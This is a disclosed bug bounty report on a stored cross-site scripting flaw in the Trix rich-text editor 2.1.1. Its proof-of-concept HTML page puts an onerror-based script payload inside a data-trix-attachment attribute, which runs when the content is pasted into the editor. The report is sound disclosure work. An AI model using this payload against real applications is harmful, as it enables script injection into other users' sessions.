# Stored XSS on trix editor version 2.1.1

## Report Details
- **Report ID**: 2521419
- **URL**: https://hackerone.com/reports/2521419
- **State**: Closed
- **Severity**: high
- **Submitted**: 2024-05-27T10:14:46.823Z
- **Disclosed**: 2024-11-04T12:58:12.330Z

## Reporter
- **Username**: thwin_htet
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: basecamp

## Vulnerability Information
The Trix editor  is vulnerable to arbitrary code execution when copying and pasting content from the web or other documents with markup into the editor. The vulnerability stems from improper sanitization of pasted content, allowing an attacker to embed malicious scripts which are executed within the context of the application.

### Vulnerable Version
2.1.1

### Steps to Reproduce
1. Run this HTML code on browser.
```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Trix Editor XSS Demo</title>
  <script src="https://cdn.jsdelivr.net/npm/trix@2.1.1/dist/trix.umd.min.js"></script>
  <link href="https://cdn.jsdelivr.net/npm/trix@2.1.1/dist/trix.min.css" rel="stylesheet">
</head>
<body>
  <h1>Trix Editor XSS Demo</h1>
  <trix-editor></trix-editor>
  <script>
  document.write(`copy<div data-trix-attachment="{&quot;contentType&quot;:&quot;text/html5&quot;,&quot;content&quot;:&quot;&lt;img src=1 onerror=alert(document.domain)&gt;XSS POC&quot;}"></div>me`);
  </script>
</body>
</html>
```
2. Click `copy me` and paste it in trix editor.

{F3302252}

3. Alert will pop up.

This could be a bypass of recent Trix Editor CVE : CVE-2024-34341
Ref : https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99

## Impact

An attacker could exploit these vulnerabilities to execute arbitrary JavaScript code within the context of the user's session, potentially leading to unauthorized actions being performed or sensitive information being disclosed.

## Attachments
- image.png
